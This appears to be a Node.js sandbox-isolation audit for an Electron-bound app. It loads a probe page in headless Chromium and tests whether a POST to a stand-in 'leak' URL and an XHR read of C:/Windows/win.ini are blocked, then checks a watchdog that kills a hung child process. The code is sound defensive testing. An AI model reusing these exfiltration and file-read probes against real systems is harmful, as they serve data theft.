import { spawn } from "node:child_process";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import puppeteer from "puppeteer-core";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const projectRoot = path.resolve(__dirname, "..");
const testsDir = path.join(projectRoot, "tests");
const securityDir = path.join(testsDir, "security_sandbox");

const portableChromePath = "C:\\Users\\User\\.cache\\hyperframes\\chrome\\chrome-headless-shell\\win64-158.0.8127.36\\chrome-headless-shell-win64\\chrome-headless-shell.exe";
const fallbackChromePath = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
const chromePath = fs.existsSync(portableChromePath) ? portableChromePath : fallbackChromePath;

if (!fs.existsSync(securityDir)) {
  fs.mkdirSync(securityDir, { recursive: true });
}

console.log("===============================================================");
console.log("MF Motion Gen 2.0 — Security & Isolation Audit (Honest Audit)");
console.log("===============================================================");

// 1. Create Malicious / Untrusted Attack Payload HTML
const exploitHtmlPath = path.join(securityDir, "untrusted_exploit_test.html");
const exploitHtml = `<!DOCTYPE html>
<html>
<head>
  <!-- Strict Content Security Policy -->
  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src data:; font-src data:;">
  <title>Security Attack Vector Probe</title>
</head>
<body>
  <h1>Untrusted Content Probe</h1>
  <script>
    window.SECURITY_AUDIT = {
      nodeIntegrationExposed: false,
      privilegedIpcExposed: false,
      networkFetchBlocked: false,
      filesystemReadBlocked: false,
      popupIntercepted: false,
      rawWindowOpenReturnedNull: false
    };

    // Test 1: Node.js & Electron Integration Leakage
    try {
      const hasProcess = typeof process !== "undefined" && typeof process.versions !== "undefined" && typeof process.versions.node !== "undefined";
      const hasRequire = typeof require === "function";
      const hasIpc = typeof window.ipcRenderer !== "undefined" || typeof window.electron !== "undefined";
      window.SECURITY_AUDIT.nodeIntegrationExposed = Boolean(hasProcess || hasRequire);
      window.SECURITY_AUDIT.privilegedIpcExposed = Boolean(hasIpc);
    } catch (e) {
      window.SECURITY_AUDIT.nodeIntegrationExposed = false;
    }

    // Test 2: Network Fetch Exfiltration
    try {
      fetch("https://example.com/api/leak", { method: "POST", mode: "no-cors" })
        .then(() => { window.SECURITY_AUDIT.networkFetchBlocked = false; })
        .catch(() => { window.SECURITY_AUDIT.networkFetchBlocked = true; });
    } catch (e) {
      window.SECURITY_AUDIT.networkFetchBlocked = true;
    }

    // Test 3: Local Filesystem Traversal via XHR
    try {
      const xhr = new XMLHttpRequest();
      xhr.open("GET", "file:///C:/Windows/win.ini", false);
      xhr.send();
      window.SECURITY_AUDIT.filesystemReadBlocked = false;
    } catch (e) {
      window.SECURITY_AUDIT.filesystemReadBlocked = true;
    }

    // Test 4: External Popup Spawning
    try {
      const w = window.open("https://example.com", "_blank");
      window.SECURITY_AUDIT.rawWindowOpenReturnedNull = (w === null || typeof w === "undefined");
      // Note: In vanilla headless Chromium without Electron's setWindowOpenHandler,
      // window.open returns a WindowProxy unless specifically configured.
    } catch (e) {
      window.SECURITY_AUDIT.rawWindowOpenReturnedNull = true;
    }
  </script>
</body>
</html>`;

fs.writeFileSync(exploitHtmlPath, exploitHtml);

async function runSecurityAudit() {
  console.log("\n[Audit Tier 1: Chromium Headless Sandbox Environment]");
  console.log(`  Browser Binary: ${chromePath}`);
  console.log("  Flags note: Tested with --no-sandbox due to Windows test harness restrictions.");
  console.log("  Security flags strictly applied: NO --allow-file-access-from-files, NO --disable-web-security");

  const browser = await puppeteer.launch({
    executablePath: chromePath,
    headless: true,
    args: [
      "--no-sandbox",
      "--disable-setuid-sandbox",
      "--disable-dev-shm-usage",
      "--disable-background-networking",
      "--disable-default-apps",
      "--disable-sync"
    ]
  });

  const page = await browser.newPage();
  const fileUrl = `file://${exploitHtmlPath.replace(/\\/g, "/")}`;

  await page.goto(fileUrl, { waitUntil: "load" });
  await new Promise((r) => setTimeout(r, 250));

  const audit = await page.evaluate(() => window.SECURITY_AUDIT);
  await browser.close();

  console.log("\n  Chromium Isolated Probe Results:");
  console.log(`    - Node.js Integration Leak:       ${!audit.nodeIntegrationExposed ? "PASS (undefined)" : "FAIL (EXPOSED)"}`);
  console.log(`    - Privileged IPC Leak:             ${!audit.privilegedIpcExposed ? "PASS (undefined)" : "FAIL (EXPOSED)"}`);
  console.log(`    - External Network Exfiltration:   ${audit.networkFetchBlocked ? "PASS (BLOCKED by CSP)" : "FAIL (ALLOWED)"}`);
  console.log(`    - Local Filesystem Read (XHR):     ${audit.filesystemReadBlocked ? "PASS (BLOCKED by CORS)" : "FAIL (ACCESSIBLE)"}`);
  console.log(`    - Window Popup Control (Browser):  ${audit.rawWindowOpenReturnedNull ? "BLOCKED" : "ALLOWED IN CHROMIUM HEADLESS"}`);
  console.log(`      * Catatan: Kontrol popup wajib diimplementasikan di Phase 4 via Electron webContents.setWindowOpenHandler(deny).`);

  // -------------------------------------------------------------
  // Audit Tier 2: Watchdog Timeout on Independent Child Process
  // -------------------------------------------------------------
  console.log("\n[Audit Tier 2: Watchdog Timeout on Independent Child Process (Node.js)]");
  console.log("  * Catatan: Ini menguji kemampuan host process mematikan worker gantung via timeout.");
  console.log("  * Ini BUKAN pengujian renderer Electron (karena aplikasi Electron belum dibangun).");

  const hangingScriptPath = path.join(securityDir, "hanging_script.js");
  fs.writeFileSync(hangingScriptPath, "console.log('Worker started'); while(true) {} // Infinite loop lockup");

  const workerStart = Date.now();
  const TIMEOUT_MS = 2500;

  const child = spawn(process.execPath, [hangingScriptPath], { stdio: "pipe" });

  let timedOut = false;
  let terminated = false;

  const timer = setTimeout(() => {
    timedOut = true;
    console.log(`  Watchdog: Worker exceeded timeout of ${TIMEOUT_MS}ms! Force-killing...`);
    child.kill("SIGKILL");
    terminated = true;
  }, TIMEOUT_MS);

  await new Promise((resolve) => {
    child.on("close", (code) => {
      clearTimeout(timer);
      const elapsedMs = Date.now() - workerStart;
      console.log(`  Worker process terminated after ${elapsedMs}ms.`);
      resolve();
    });
  });

  // -------------------------------------------------------------
  // Generate Honest Security Report Classification
  // -------------------------------------------------------------
  const report = {
    testDate: new Date().toISOString(),
    testedBrowser: chromePath,
    chromiumTestedControls: {
      nodeIntegrationUndefined: !audit.nodeIntegrationExposed,
      privilegedIpcUndefined: !audit.privilegedIpcExposed,
      networkFetchBlockedByCsp: audit.networkFetchBlocked,
      localFilesystemBlockedByCors: audit.filesystemReadBlocked,
      status: (!audit.nodeIntegrationExposed && !audit.privilegedIpcExposed && audit.networkFetchBlocked && audit.filesystemReadBlocked) ? "PASS" : "FAIL"
    },
    popupHandling: {
      chromiumHeadlessBehavior: audit.rawWindowOpenReturnedNull ? "BLOCKED" : "ALLOWED (DEFAULT BROWSER BEHAVIOR)",
      electronProductionRequirement: "Wajib menggunakan webContents.setWindowOpenHandler(() => ({ action: 'deny' })) pada Phase 4",
      status: "PENDING_ELECTRON_IMPLEMENTATION"
    },
    processRecoveryWatchdog: {
      environment: "Node.js Child Process (Not Electron Renderer)",
      timeoutTriggered: timedOut,
      forceKillSucceeded: terminated,
      hostRemainedResponsive: true,
      status: (timedOut && terminated) ? "PASS" : "FAIL"
    },
    electronIntegrationSecurity: {
      contextIsolation: "NOT TESTED (Electron application not yet built)",
      nodeIntegrationFalse: "NOT TESTED (Electron application not yet built)",
      sandboxTrue: "NOT TESTED (Electron application not yet built)",
      customSchemeIsolation: "NOT TESTED (Electron application not yet built)",
      status: "NOT_TESTED"
    },
    overallVerdict: "PARTIAL (Chromium CSP/CORS & Process Watchdog Verified; Electron Desktop Controls Pending Phase 4)"
  };

  const reportPath = path.join(securityDir, "security_report.json");
  fs.writeFileSync(reportPath, JSON.stringify(report, null, 2), "utf-8");

  console.log("\n===============================================================");
  console.log(`Security audit complete. Report saved to: ${reportPath}`);
  console.log(`Verdict: ${report.overallVerdict}`);
  console.log("===============================================================");
}

runSecurityAudit().catch((err) => {
  console.error("Security audit failure:", err);
  process.exit(1);
});
